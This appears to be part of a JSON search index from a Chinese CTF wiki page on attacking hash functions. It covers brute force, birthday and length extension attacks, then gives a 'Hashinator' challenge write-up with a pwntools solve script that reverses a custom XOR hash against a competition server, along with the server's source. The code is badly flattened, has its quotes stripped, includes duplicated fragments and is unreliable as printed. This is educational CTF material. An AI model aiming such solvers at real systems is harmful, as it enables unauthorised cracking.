            "text": "Hash Attack\n\n\n\u5e38\u89c1\u7684Hash\u51fd\u6570\u7684\u653b\u51fb\u65b9\u6cd5\u4e3b\u8981\u6709\n\n\n\n\n\u66b4\u529b\u653b\u51fb\uff1a\u4e0d\u4f9d\u8d56\u4e8e\u4efb\u4f55\u7b97\u6cd5\u7ec6\u8282\uff0c\u4ec5\u4e0eHash\u503c\u957f\u5ea6\u6709\u5173\uff1b\n\n\n\u751f\u65e5\u653b\u51fb\u6cd5(Birthday Attack)\uff1a\u6ca1\u6709\u5229\u7528Hash\u51fd\u6570\u7684\u7ed3\u6784\u548c\u4efb\u4f55\u4ee3\u6570\u5f31\u6027\u8d28\uff0c\u53ea\u4f9d\u8d56\u4e8e\u6d88\u606f\u6458\u8981\u7684\u957f\u5ea6\uff0c\u5373Hash\u503c\u7684\u957f\u5ea6\u3002\n\n\n\u4e2d\u70b9\u4ea4\u4f1a\u653b\u51fb\u6cd5(Meet-In-The-Middle)\uff1a\u662f\u751f\u65e5\u653b\u51fb\u7684\u4e00\u79cd\u53d8\u5f62\uff0c\u4e0d\u6bd4\u8f83Hash\u503c\uff0c\u800c\u662f\u6bd4\u8f83\u4e2d\u95f4\u53d8\u91cf\u3002\u8fd9\u79cd\u653b\u51fb\u4e3b\u8981\u9002\u7528\u4e8e\u653b\u51fb\u5177\u6709\u5206\u7ec4\u94fe\u7ed3\u6784\u7684Hash\u65b9\u6848\u3002\n\n\n\u5bc6\u7801\u5206\u6790\uff1a\u4f9d\u8d56\u4e8e\u5177\u4f53\u7b97\u6cd5\u7684\u8bbe\u8ba1\u7f3a\u70b9\u3002\n\n\n\n\n\u66b4\u529b\u653b\u51fb\n\n\nHashCat \u5de5\u5177\n \u53ef\u4ee5\u8bf4\u662f\u76ee\u524d\u6700\u597d\u7684\u57fa\u4e8e CPU \u548c GPU \u7834\u89e3 Hash \u7684\u8f6f\u4ef6\uff0c\u76f8\u5173\u94fe\u63a5\u5982\u4e0b\n\n\nHashCat \u5b98\u7f51\n\n\nHashCat \u7b80\u5355\u4f7f\u7528\n\n\n\u54c8\u5e0c\u957f\u5ea6\u62d3\u5c55\u653b\u51fb\uff08hash length extension attacks\uff09\n\n\n\u4ecb\u7ecd\n\n\n\u57fa\u672c\u5b9a\u4e49\u5982\u4e0b\uff0c\u6e90\u81ea\n\u7ef4\u57fa\u767e\u79d1\n\u3002\n\n\n\u54c8\u5e0c\u957f\u5ea6\u6269\u5c55\u653b\u51fb(Hash Length Extension Attacks)\u662f\u6307\u9488\u5bf9\u67d0\u4e9b\u5141\u8bb8\u5305\u542b\u989d\u5916\u4fe1\u606f\u7684\u52a0\u5bc6\u6563\u5217\u51fd\u6570\u7684\u653b\u51fb\u624b\u6bb5\u3002\u8be5\u653b\u51fb\u9002\u7528\u4e8e\u5728\n\u6d88\u606f\u4e0e\u5bc6\u94a5\u7684\u957f\u5ea6\u5df2\u77e5\n\u7684\u60c5\u5f62\u4e0b\uff0c\u6240\u6709\u91c7\u53d6\u4e86 H(key \u2225 message) \u6b64\u7c7b\u6784\u9020\u7684\u6563\u5217\u51fd\u6570\u3002MD5\u548cSHA-1 \u7b49\u57fa\u4e8e Merkle\u2013Damg\u00e5rd \u6784\u9020\u7684\u7b97\u6cd5\u5747\u5bf9\u6b64\u7c7b\u653b\u51fb\u663e\u793a\u51fa\u8106\u5f31\u6027\u3002\n\n\n\u8fd9\u7c7b\u54c8\u5e0c\u51fd\u6570\u6709\u4ee5\u4e0b\u7279\u70b9\n\n\n\n\n\u6d88\u606f\u586b\u5145\u65b9\u5f0f\u90fd\u6bd4\u8f83\u7c7b\u4f3c\uff0c\u9996\u5148\u5728\u6d88\u606f\u540e\u9762\u6dfb\u52a0\u4e00\u4e2a1\uff0c\u7136\u540e\u586b\u5145\u82e5\u5e72\u4e2a0\uff0c\u76f4\u81f3\u603b\u957f\u5ea6\u4e0e 448 \u540c\u4f59\uff0c\u6700\u540e\u5728\u5176\u540e\u9644\u4e0a64\u4f4d\u7684\u6d88\u606f\u957f\u5ea6\uff08\u586b\u5145\u524d\uff09\u3002\n\n\n\u6bcf\u4e00\u5757\u5f97\u5230\u7684\u94fe\u63a5\u53d8\u91cf\u90fd\u4f1a\u88ab\u4f5c\u4e3a\u4e0b\u4e00\u6b21\u6267\u884chash\u51fd\u6570\u7684\u521d\u59cb\u5411\u91cfIV\u3002\u5728\u6700\u540e\u4e00\u5757\u7684\u65f6\u5019\uff0c\u624d\u4f1a\u5c06\u5176\u5bf9\u5e94\u7684\u94fe\u63a5\u53d8\u91cf\u8f6c\u6362\u4e3ahash\u503c\u3002\n\n\n\n\n\u4e00\u822c\u653b\u51fb\u65f6\u5e94\u6ee1\u8db3\u5982\u4e0b\u6761\u4ef6\n\n\n\n\n\u6211\u4eec\u5df2\u77e5 key \u7684\u957f\u5ea6\uff0c\u5982\u679c\u4e0d\u77e5\u9053\u7684\u8bdd\uff0c\u9700\u8981\u7206\u7834\u51fa\u6765\n\n\n\u6211\u4eec\u53ef\u4ee5\u63a7\u5236 message \u7684\u6d88\u606f\u3002\n\n\n\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e86\u5305\u542b key \u7684\u4e00\u4e2a\u6d88\u606f\u7684hash\u503c\u3002\n\n\n\n\n\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u5f97\u5230\u4e00\u5bf9(messge,x)\u6ee1\u8db3x=H(key \u2225 message)\u867d\u7136\u6211\u4eec\u5e76\u4e0d\u6e05\u695akey\u7684\u5185\u5bb9\u3002\n\n\n\u653b\u51fb\u539f\u7406\n\n\n\u8fd9\u91cc\u4e0d\u59a8\u5047\u8bbe\u6211\u4eec\u6211\u4eec\u77e5\u9053\u4e86 hash(key+s) \u7684 hash \u503c\uff0c\u5176\u4e2d s \u662f\u5df2\u77e5\u7684\uff0c\u90a3\u4e48\u5176\u672c\u8eab\u5728\u8ba1\u7b97\u7684\u65f6\u5019\uff0c\u5fc5\u7136\u4f1a\u8fdb\u884c\u586b\u5145\u3002\u90a3\u4e48\u6211\u4eec\u9996\u5148\u53ef\u4ee5\u5f97\u5230 key+s \u6269\u5c55\u540e\u7684\u5b57\u7b26\u4e32 now\uff0c\u5373\n\n\nnow=key|s|padding\n\n\n\u90a3\u4e48\u5982\u679c\u6211\u4eec\u5728 now \u7684\u540e\u9762\u518d\u6b21\u9644\u52a0\u4e0a\u4e00\u90e8\u5206\u4fe1\u606fextra\uff0c\u5373\n\n\nkey|s|padding|extra\n\n\n\u8fd9\u6837\u518d\u53bb\u8ba1\u7b97hash\u503c\u7684\u65f6\u5019\uff0c\n\n\n\n\n\u4f1a\u5bf9 extra \u8fdb\u884c\u586b\u5145\u76f4\u5230\u6ee1\u8db3\u6761\u4ef6\u3002\n\n\n\u5148\u8ba1\u7b97 now \u5bf9\u5e94\u7684\u94fe\u63a5\u53d8\u91cf IV1\uff0c\u800c\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u8fd9\u90e8\u5206\u7684 hash \u503c\uff0c\u5e76\u4e14\u94fe\u63a5\u53d8\u91cf\u4ea7\u751f hash \u503c\u7684\u7b97\u6cd5\u662f\u53ef\u9006\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u94fe\u63a5\u53d8\u91cf\u3002\n\n\n\u4e0b\u9762\u4f1a\u6839\u636e\u5f97\u5230\u7684\u94fe\u63a5\u53d8\u91cf IV1\uff0c\u5bf9 extra \u90e8\u5206\u8fdb\u884c\u54c8\u5e0c\u7b97\u6cd5\uff0c\u5e76\u8fd4\u56dehash\u503c\u3002\n\n\n\n\n\u90a3\u4e48\u65e2\u7136\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e86\u7b2c\u4e00\u90e8\u5206\u7684 hash \u503c\uff0c\u5e76\u4e14\uff0c\u6211\u4eec\u8fd8\u77e5\u9053 extra \u7684\u503c\uff0c\u90a3\u4e48\u6211\u4eec\u4fbf\u53ef\u4ee5\u5f97\u5230\u6700\u540e\u7684hash\u503c\u3002\n\n\n\u800c\u4e4b\u524d\u6211\u4eec\u4e5f\u8bf4\u4e86\u6211\u4eec\u53ef\u4ee5\u63a7\u5236 message \u7684\u503c\u3002\u90a3\u4e48\u5176\u5b9e s\uff0cpadding\uff0cextra \u6211\u4eec\u90fd\u662f\u53ef\u4ee5\u63a7\u5236\u7684\u3002\u6240\u4ee5\u6211\u4eec\u81ea\u7136\u53ef\u4ee5\u627e\u5230\u5bf9\u5e94\u7684(message,x)\u6ee1\u8db3x=hash(key|message)\u3002\n\n\n\u4f8b\u5b50\n\n\n\u4f3c\u4e4e\u5927\u90fd\u662fweb\u91cc\u9762\u7684\uff0c\uff0c\u4e0d\u592a\u61c2web\uff0c\u6682\u65f6\u5148\u4e0d\u7ed9\u4f8b\u5b50\u4e86\u3002\n\n\n\u5de5\u5177\n\n\n\n\nhashpump\n\n\n\n\n\u5982\u4f55\u4f7f\u7528\u8bf7\u53c2\u8003github\u4e0a\u7684readme\u3002\n\n\nhash\u7b97\u6cd5\u8bbe\u8ba1\u6709\u8bef\n\n\n\u4e00\u4e9b\u81ea\u5b9a\u4e49\u7684hash\u7b97\u6cd5\u53ef\u80fd\u662f\u53ef\u9006\u7684\u3002\n\n\nHashinator\n\n\n\u9898\u76ee\u7684\u903b\u8f91\u5f88\u7b80\u5355\uff0c\u4ece\u4e00\u4e2a\u77e5\u540d\u7684\u5bc6\u7801\u5b57\u5178\"rockyou\"\u6311\u9009\u51fa\u4e00\u4e2a\npassword\n\uff0c\u5e76\u4e14\u4f7f\u7528\u591a\u79cdhash\u7b97\u6cd5\u968f\u673a\u7684\u54c8\u5e0c32\u8f6e\u3002\u6211\u4eec\u9700\u8981\u4ece\u6700\u540e\u7684hash\u7ed3\u679c\u4e2d\u7834\u89e3\u51fa\u539f\u59cb\u7684\npassword\n\u3002\n\n\n\u5206\u6790\n\n\n\u9898\u76ee\u91c7\u7528\u7684hash\u7b97\u6cd5\u6709\uff1a\nmd5\n\uff0c\nsha1\n\uff0c\nblake\n\uff0c\nscrypt\n\u3002\n\u5173\u952e\u7684\u4ee3\u7801\u5982\u4e0b\uff1a\n\n    \npassword\n \n=\n \nself\n.\ngenerate_password\n()\n     \n# from rock_you.txt\n\n    \nsalt\n \n=\n \nself\n.\ngenerate_salt\n(\npassword\n)\n     \n# \u4e0epassword\u7684\u957f\u5ea6\u6709\u5173\n\n    \nhash_rounds\n \n=\n \nself\n.\ngenerate_rounds\n()\n    \n# \u751f\u6210\u8fdb\u884chash\u7b97\u6cd5\u7684\u987a\u5e8f\n\n    \npassword_hash\n \n=\n \nself\n.\ncalculate_hash\n(\nsalt\n \n+\n \npassword\n,\n \nhash_rounds\n)\n\n\n\n1. \u7a0b\u5e8f\u9996\u5148\u901a\u8fc7\u4ece\nrockyou.txt\n\u4e2d\u968f\u673a\u62bd\u53d6\u4e00\u4e2a\npassword\n\uff0c\u4f5c\u4e3a\u52a0\u5bc6\u7684\u660e\u6587\u3002\n2. \u7136\u540e\u6839\u636e\u62bd\u53d6\u7684\npassword\n\u7684\u957f\u5ea6\uff0c\u751f\u6210\u4e00\u4e2a\u957f\u5ea6\u4e3a\n128 - len(password)\n\u7684\nsalt\n\u3002\n3. \u4ece\u4e4b\u524d\u5217\u4e3e\u76844\u79cdhash\u7b97\u6cd5\u4e2d\u62bd\u53d6\uff0c\u7ec4\u621032\u8f6e\u7684\u54c8\u5e0c\u8fd0\u7b97\u3002\n4. \u6839\u636e\u4e4b\u524d\u5f97\u5230\u7684\npassword\n\u3001\nsalt\n\u8ba1\u7b97\u51fa\u6700\u540e\u7ed9\u6211\u4eec\u7684\npassword_hash\n\u3002\n\n\n\u5f88\u660e\u663e\uff0c\u6211\u4eec\u4e0d\u53ef\u80fd\u901a\u8fc7\u9006\u5411hash\u7b97\u6cd5\u6765\u5b8c\u6210\u9898\u76ee\u3002\n\u6211\u4eec\u77e5\u9053\u6240\u6709\u7684\u53ef\u80fd\u7684\u660e\u6587\uff0c\u9996\u5148\u8003\u8651\u80fd\u5426\u901a\u8fc7\u6784\u9020\u5f69\u8679\u8868\u6765\u5b8c\u6210\u7a77\u4e3e\u3002\u4f46\u662f\u6ce8\u610f\u5230\ngenerate_salt()\n\u51fd\u6570\u4e2d\uff0c\nsalt\n\u548c\npassword\n\u7684\u957f\u5ea6\u7ec4\u5408\u8d85\u8fc7\u4e86128byte\u7684\u957f\u5ea6\uff0c\u5e76\u4e14\u88ab\u6ce8\u91ca\u4e86\n\n    msize = 128 # f-you hashcat :D\n\n\nso\uff0c\u53ea\u80fd\u65e0\u5948\u653e\u5f03\u3002\n\n\n\u90a3\u8fd9\u6837\u7684\u8bdd\uff0c\u53ea\u5b58\u5728\u4e00\u79cd\u53ef\u80fd\uff0c\u4e5f\u5373\u7b97\u6cd5\u53ef\u9006\u3002\u67e5\u770b\ncalculate_hash()\n\u51fd\u6570\u7684\u5177\u4f53\u5b9e\u73b0\uff0c\u53ef\u4ee5\u53d1\u73b0\u5982\u4e0b\u53ef\u7591\u7684\u4ee3\u7801\uff1a\n\nfor\n \ni\n \nin\n \nrange\n(\nlen\n(\nhash_rounds\n)):\n\n    \ninterim_salt\n \n=\n \nxor\n(\ninterim_salt\n,\n \nhash_rounds\n[\n-\n1\n-\ni\n](\ninterim_hash\n))\n\n    \ninterim_hash\n \n=\n \nxor\n(\ninterim_hash\n,\n \nhash_rounds\n[\ni\n](\ninterim_salt\n))\n\n\nfinal_hash\n \n=\n \ninterim_salt\n \n+\n \ninterim_hash\n\n\n\n\u91cd\u65b0\u68b3\u7406\u4e00\u4e0b\u6211\u4eec\u77e5\u9053\u7684\u4fe1\u606f\uff1a\n1. hash_rounds\u4e2d\u4fdd\u5b58\u4e8632\u8f6e\uff0c\u5373\u6bcf\u8f6e\u8981\u4f7f\u7528\u7684hash\u51fd\u6570\u53e5\u67c4\u3002\n2. final_hash\u662f\u6700\u540e\u7ed9\u6211\u4eec\u7684hash\u7ed3\u679c\u3002\n3. hash_rounds\u4e2d\u7684\u5185\u5bb9\u4e5f\u4f1a\u5728\u751f\u6210\u4e4b\u540e\u6253\u5370\u7ed9\u6211\u4eec\u3002\n4. \u6211\u4eec\u5e0c\u671b\u5f97\u5230\ninterim_salt\n\u548c\ninterim_hash\n\u5728\u7b2c\u4e00\u8f6e\u7684\u503c\u3002\n5. \ninterim_salt\n\u548c\ninterim_hash\n\u7684\u957f\u5ea6\u5747\u4e3a64byte\u3002\n\n\n\u4ed4\u7ec6\u89c2\u5bdf\u4e00\u4e0b\ninterim_salt\n\u548c\ninterim_hash\n\u7684\u8ba1\u7b97\u65b9\u6cd5\uff0c\u53ef\u4ee5\u53d1\u73b0\u5b83\u662f\u53ef\u9006\u7684\u3002\n\n\n\n\n\ninterim\\_hash_1 = interim\\_hash_2 \\oplus hash\\_rounds[i](interim\\_salt_3)\n\n\n\n\ninterim\\_hash_1 = interim\\_hash_2 \\oplus hash\\_rounds[i](interim\\_salt_3)\n\n\n\n\n\n\u8fd9\u884c\u4ee3\u7801\u91cc\uff0c\u6211\u4eec\u5df2\u77e5 \ninterim\\_hash_1\ninterim\\_hash_1\n \u548c \ninterim\\_salt_3\ninterim\\_salt_3\n\uff0c\u7531\u6b64\u53ef\u4ee5\u63a8\u51fa\ninterim\\_hash_2\ninterim\\_hash_2\n\u7684\u503c\uff0c\u800c\ninterim\\_hash_2\ninterim\\_hash_2\n\u5219\u662f\u4e0a\u4e00\u8f6e\u7684\ninterim_hash\n\u3002\n\u4ee5\u6b64\u65b9\u6cd5\u9006\u63a832\u6b21\uff0c\u5219\u53ef\u4ee5\u5f97\u5230\u6700\u521d\u7684\npassword\n\u548c\nsalt\n\u3002\n\n\n\u5177\u4f53\u7684\u89e3\u5bc6\u811a\u672c\u4e3a\uff1a\n\nimport\n \nos\n\n\nimport\n \nhashlib\n\n\nimport\n \nsocket\n\n\nimport\n \nthreading\n\n\nimport\n \nsocketserver\n\n\nimport\n \nstruct\n\n\nimport\n \ntime\n\n\nimport\n \nthreading\n\n\n# import pyscrypt\n\n\nfrom\n \nbase64\n \nimport\n \nb64encode\n,\n \nb64decode\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\ndef\n \nmd5\n(\nbytestring\n):\n\n    \nreturn\n \nhashlib\n.\nmd5\n(\nbytestring\n)\n.\ndigest\n()\n\n\ndef\n \nsha\n(\nbytestring\n):\n\n    \nreturn\n \nhashlib\n.\nsha1\n(\nbytestring\n)\n.\ndigest\n()\n\n\ndef\n \nblake\n(\nbytestring\n):\n\n    \nreturn\n \nhashlib\n.\nblake2b\n(\nbytestring\n)\n.\ndigest\n()\n\n\ndef\n \nscrypt\n(\nbytestring\n):\n\n    \nl\n \n=\n \nint\n(\nlen\n(\nbytestring\n)\n \n/\n \n2\n)\n\n    \nsalt\n \n=\n \nbytestring\n[:\nl\n]\n\n    \np\n \n=\n \nbytestring\n[\nl\n:]\n\n    \nreturn\n \nhashlib\n.\nscrypt\n(\np\n,\n \nsalt\n=\nsalt\n,\n \nn\n=\n2\n**\n16\n,\n \nr\n=\n8\n,\n \np\n=\n1\n,\n \nmaxmem\n=\n67111936\n)\n\n    \n# return pyscrypt.hash(p, salt, 2**16, 8, 1, dkLen=64)\n\n\ndef\n \nxor\n(\ns1\n,\n \ns2\n):\n\n    \nreturn\n \nb\n.\njoin\n([\nbytes\n([\ns1\n[\ni\n]\n \n^\n \ns2\n[\ni\n \n%\n \nlen\n(\ns2\n)]])\n \nfor\n \ni\n \nin\n \nrange\n(\nlen\n(\ns1\n))])\n\n\ndef\n \nmain\n():\n\n    \n# io = socket.socket(family=socket.AF_INET)\n\n    \n# io.connect((\n47.88.216.38\n, 20013))\n\n    \nio\n \n=\n \nremote\n(\n47.88.216.38\n,\n \n20013\n)\n\n    \nprint\n(\nio\n.\nrecv\n(\n1000\n))\n\n    \nans_array\n \n=\n \nbytearray\n()\n\n    \nwhile\n \nTrue\n:\n\n        \nbuf\n \n=\n \nio\n.\nrecv\n(\n1\n)\n\n        \nif\n \nbuf\n:\n\n            \nans_array\n.\nextend\n(\nbuf\n)\n\n        \nif\n \nbuf\n \n==\n \nb\n!\n:\n\n            \nbreak\n\n\n    \npassword_hash_base64\n \n=\n \nans_array\n[\nans_array\n.\nfind\n(\nb\nb\n)\n \n+\n \n2\n:\n \nans_array\n.\nfind\n(\nb\n\\n\n)]\n\n    \npassword_hash\n \n=\n \nb64decode\n(\npassword_hash_base64\n)\n\n    \nprint\n(\npassword:\n,\n \npassword_hash\n)\n\n    \nmethod_bytes\n \n=\n \nans_array\n[\n\n        \nans_array\n.\nfind\n(\nb\nused:\n\\n\n)\n \n+\n \n6\n \n:\n \nans_array\n.\nfind\n(\nb\n\\n\nYour\n)\n\n    \n]\n\n    \nmethods\n \n=\n \nmethod_bytes\n.\nsplit\n(\nb\n\\n\n)\n\n    \nmethods\n \n=\n \n[\nbytes\n(\nx\n.\nstrip\n(\nb\n- \n))\n.\ndecode\n()\n \nfor\n \nx\n \nin\n \nmethods\n]\n\n    \nprint\n(\nmethods\n)\n\n    \nin_salt\n \n=\n \npassword_hash\n[:\n64\n]\n\n    \nin_hash\n \n=\n \npassword_hash\n[\n64\n:]\n\n    \nfor\n \npos\n,\n \nneg\n \nin\n \nzip\n(\nmethods\n,\n \nmethods\n[::\n-\n1\n]):\n\n        \n\n\n            interim_salt = xor(interim_salt, hash_rounds[-1-i](interim_hash))\n\n\n            interim_hash = xor(interim_hash, hash_rounds[i](interim_salt))\n\n\n        \n\n        \nin_hash\n \n=\n \nxor\n(\nin_hash\n,\n \neval\n(\n{}(in_salt)\n.\nformat\n(\nneg\n)))\n\n        \nin_salt\n \n=\n \nxor\n(\nin_salt\n,\n \neval\n(\n{}(in_hash)\n.\nformat\n(\npos\n)))\n\n    \nprint\n(\nin_hash\n,\n \nin_salt\n)\n\n    \nprint\n(\nin_hash\n[\n-\n20\n:])\n\n    \nio\n.\ninteractive\n()\n\n\nmain\n()\n\n\n\n\n\u539fhash\u7b97\u6cd5\n\n\nimport\n \nos\n\n\nimport\n \nhashlib\n\n\nimport\n \nsocket\n\n\nimport\n \nthreading\n\n\nimport\n \nsocketserver\n\n\nimport\n \nstruct\n\n\nimport\n \ntime\n\n\n\n# import pyscrypt\n\n\n\nfrom\n \nbase64\n \nimport\n \nb64encode\n\n\n\ndef\n \nmd5\n(\nbytestring\n):\n\n    \nreturn\n \nhashlib\n.\nmd5\n(\nbytestring\n)\n.\ndigest\n()\n\n\n\ndef\n \nsha\n(\nbytestring\n):\n\n    \nreturn\n \nhashlib\n.\nsha1\n(\nbytestring\n)\n.\ndigest\n()\n\n\n\ndef\n \nblake\n(\nbytestring\n):\n\n    \nreturn\n \nhashlib\n.\nblake2b\n(\nbytestring\n)\n.\ndigest\n()\n\n\n\ndef\n \nscrypt\n(\nbytestring\n):\n\n    \nl\n \n=\n \nint\n(\nlen\n(\nbytestring\n)\n \n/\n \n2\n)\n\n    \nsalt\n \n=\n \nbytestring\n[:\nl\n]\n\n    \np\n \n=\n \nbytestring\n[\nl\n:]\n\n    \nreturn\n \nhashlib\n.\nscrypt\n(\np\n,\n \nsalt\n=\nsalt\n,\n \nn\n=\n2\n**\n16\n,\n \nr\n=\n8\n,\n \np\n=\n1\n,\n \nmaxmem\n=\n67111936\n)\n\n    \n# return pyscrypt.hash(p, salt, 2**16, 8, 1)\n\n\n\ndef\n \nxor\n(\ns1\n,\n \ns2\n):\n\n    \nreturn\n \nb\n.\njoin\n([\nbytes\n([\ns1\n[\ni\n]\n \n^\n \ns2\n[\ni\n \n%\n \nlen\n(\ns2\n)]])\n \nfor\n \ni\n \nin\n \nrange\n(\nlen\n(\ns1\n))])\n\n\n\nclass\n \nHashHandler\n(\nsocketserver\n.\nBaseRequestHandler\n):\n\n\n    \nwelcome_message\n \n=\n \n\n\nWelcome, young wanna-be Cracker, to the Hashinator.\n\n\n\nTo prove your worthiness, you must display the power of your cracking skills.\n\n\n\nThe test is easy:\n\n\n1. We send you a password from the rockyou list, hashed using multiple randomly chosen algorithms.\n\n\n2. You crack the hash and send back the original password.\n\n\n\nAs you already know the dictionary and won\nt need any fancy password rules, {} seconds should be plenty, right?\n\n\n\nPlease wait while we generate your hash...\n\n\n    \n\n\n    \nhashes\n \n=\n \n[\nmd5\n,\n \nsha\n,\n \nblake\n,\n \nscrypt\n]\n\n    \ntimeout\n \n=\n \n10\n\n    \ntotal_rounds\n \n=\n \n32\n\n\n    \ndef\n \nhandle\n(\nself\n):\n\n        \nself\n.\nrequest\n.\nsendall\n(\nself\n.\nwelcome_message\n.\nformat\n(\nself\n.\ntimeout\n)\n.\nencode\n())\n\n\n        \npassword\n \n=\n \nself\n.\ngenerate_password\n()\n     \n# from rock_you.txt\n\n        \nsalt\n \n=\n \nself\n.\ngenerate_salt\n(\npassword\n)\n     \n# \u4e0epassword\u7684\u957f\u5ea6\u6709\u5173\n\n        \nhash_rounds\n \n=\n \nself\n.\ngenerate_rounds\n()\n    \n# \u751f\u6210\u8fdb\u884chash\u7b97\u6cd5\u7684\u987a\u5e8f\n\n        \npassword_hash\n \n=\n \nself\n.\ncalculate_hash\n(\nsalt\n \n+\n \npassword\n,\n \nhash_rounds\n)\n\n        \nself\n.\ngenerate_delay\n()\n\n\n        \nself\n.\nrequest\n.\nsendall\n(\nChallenge password hash: {}\n\\n\n.\nformat\n(\nb64encode\n(\npassword_hash\n))\n.\nencode\n())\n\n        \nself\n.\nrequest\n.\nsendall\n(\nRounds used:\n\\n\n.\nencode\n())\n\n        \ntest_rounds\n \n=\n \n[]\n\n        \nfor\n \nr\n \nin\n \nhash_rounds\n:\n\n            \ntest_rounds\n.\nappend\n(\nr\n)\n\n\n        \nfor\n \nr\n \nin\n \nhash_rounds\n:\n\n            \nself\n.\nrequest\n.\nsendall\n(\n- {}\n\\n\n.\nformat\n(\nr\n.\n__name__\n)\n.\nencode\n())\n\n        \nself\n.\nrequest\n.\nsendall\n(\nYour time starts now!\n\\n\n.\nencode\n())\n\n        \nself\n.\nrequest\n.\nsettimeout\n(\nself\n.\ntimeout\n)\n\n        \ntry\n:\n\n            \nresponse\n \n=\n \nself\n.\nrequest\n.\nrecv\n(\n1024\n)\n\n            \nif\n \nresponse\n.\nstrip\n()\n \n==\n \npassword\n:\n\n                \nself\n.\nrequest\n.\nsendall\n(\nCongratulations! You are a true cracking master!\n\\n\n.\nencode\n())\n\n                \nself\n.\nrequest\n.\nsendall\n(\nWelcome to the club: {}\n\\n\n.\nformat\n(\nflag\n)\n.\nencode\n())\n\n                \nreturn\n\n        \nexcept\n \nsocket\n.\ntimeout\n:\n\n            \npass\n\n        \nself\n.\nrequest\n.\nsendall\n(\nYour cracking skills are bad, and you should feel bad!\n.\nencode\n())\n\n\n\n    \ndef\n \ngenerate_password\n(\nself\n):\n\n        \nrand\n \n=\n \nstruct\n.\nunpack\n(\nI\n,\n \nos\n.\nurandom\n(\n4\n))[\n0\n]\n\n        \nlines\n \n=\n \n14344391\n \n# size of rockyou\n\n        \nline\n \n=\n \nrand\n \n%\n \nlines\n\n        \npassword\n \n=\n \n\n        \nf\n \n=\n \nopen\n(\nrockyou.txt\n,\n \nrb\n)\n\n        \nfor\n \ni\n \nin\n \nrange\n(\nline\n):\n\n            \npassword\n \n=\n \nf\n.\nreadline\n()\n\n        \nreturn\n \npassword\n.\nstrip\n()\n\n\n    \ndef\n \ngenerate_salt\n(\nself\n,\n \np\n):\n\n        \nmsize\n \n=\n \n128\n \n# f-you hashcat :D\n\n        \nsalt_size\n \n=\n \nmsize\n \n-\n \nlen\n(\np\n)\n\n        \nreturn\n \nos\n.\nurandom\n(\nsalt_size\n)\n\n\n    \ndef\n \ngenerate_rounds\n(\nself\n):\n\n        \nrand\n \n=\n \nstruct\n.\nunpack\n(\nQ\n,\n \nos\n.\nurandom\n(\n8\n))[\n0\n]\n\n        \nrounds\n \n=\n \n[]\n\n        \nfor\n \ni\n \nin\n \nrange\n(\nself\n.\ntotal_rounds\n):\n\n            \nrounds\n.\nappend\n(\nself\n.\nhashes\n[\nrand\n \n%\n \nlen\n(\nself\n.\nhashes\n)])\n\n            \nrand\n \n=\n \nrand\n \n \n2\n\n        \nreturn\n \nrounds\n\n\n    \ndef\n \ncalculate_hash\n(\nself\n,\n \npayload\n,\n \nhash_rounds\n):\n\n        \ninterim_salt\n \n=\n \npayload\n[:\n64\n]\n\n        \ninterim_hash\n \n=\n \npayload\n[\n64\n:]\n\n        \nfor\n \ni\n \nin\n \nrange\n(\nlen\n(\nhash_rounds\n)):\n\n            \ninterim_salt\n \n=\n \nxor\n(\ninterim_salt\n,\n \nhash_rounds\n[\n-\n1\n-\ni\n](\ninterim_hash\n))\n\n            \ninterim_hash\n \n=\n \nxor\n(\ninterim_hash\n,\n \nhash_rounds\n[\ni\n](\ninterim_salt\n))\n\n            \n\n\n            interim_hash = xor(\n\n\n                interim_hash,\n\n\n                hash_rounds[i](\n\n\n                    xor(interim_salt, hash_rounds[-1-i](interim_hash))\n\n\n                )\n\n\n            )\n\n\n            \n\n        \nfinal_hash\n \n=\n \ninterim_salt\n \n+\n \ninterim_hash\n\n        \nreturn\n \nfinal_hash\n\n\n    \ndef\n \ngenerate_delay\n(\nself\n):\n\n        \nrand\n \n=\n \nstruct\n.\nunpack\n(\nI\n,\n \nos\n.\nurandom\n(\n4\n))[\n0\n]\n\n        \ntime\n.\nsleep\n(\nrand\n \n/\n \n1000000000.0\n)\n\n\n\n\n\nclass\n \nThreadedTCPServer\n(\nsocketserver\n.\nThreadingMixIn\n,\n \nsocketserver\n.\nTCPServer\n):\n\n    \nallow_reuse_address\n \n=\n \nTrue\n\n\n\nPORT\n \n=\n \n1337\n\n\nHOST\n \n=\n \n0.0.0.0\n\n\nflag\n \n=\n \n\n\n\nwith\n \nopen\n(\nflag.txt\n)\n \nas\n \nf\n:\n\n    \nflag\n \n=\n \nf\n.\nread\n()\n\n\n\ndef\n \nmain\n():\n\n    \nserver\n \n=\n \nThreadedTCPServer\n((\nHOST\n,\n \nPORT\n),\n \nHashHandler\n)\n\n    \nserver_thread\n \n=\n \nthreading\n.\nThread\n(\ntarget\n=\nserver\n.\nserve_forever\n)\n\n    \nserver_thread\n.\nstart\n()\n\n    \nserver_thread\n.\njoin\n()\n\n\n\nif\n \n__name__\n \n==\n \n__main__\n:\n\n    \nmain\n()", 
            "title": "Hash Attack"
        }, 
        {
            "location": "/crypto/hash/attack/#hash-attack", 
            "text": "\u5e38\u89c1\u7684Hash\u51fd\u6570\u7684\u653b\u51fb\u65b9\u6cd5\u4e3b\u8981\u6709   \u66b4\u529b\u653b\u51fb\uff1a\u4e0d\u4f9d\u8d56\u4e8e\u4efb\u4f55\u7b97\u6cd5\u7ec6\u8282\uff0c\u4ec5\u4e0eHash\u503c\u957f\u5ea6\u6709\u5173\uff1b  \u751f\u65e5\u653b\u51fb\u6cd5(Birthday Attack)\uff1a\u6ca1\u6709\u5229\u7528Hash\u51fd\u6570\u7684\u7ed3\u6784\u548c\u4efb\u4f55\u4ee3\u6570\u5f31\u6027\u8d28\uff0c\u53ea\u4f9d\u8d56\u4e8e\u6d88\u606f\u6458\u8981\u7684\u957f\u5ea6\uff0c\u5373Hash\u503c\u7684\u957f\u5ea6\u3002  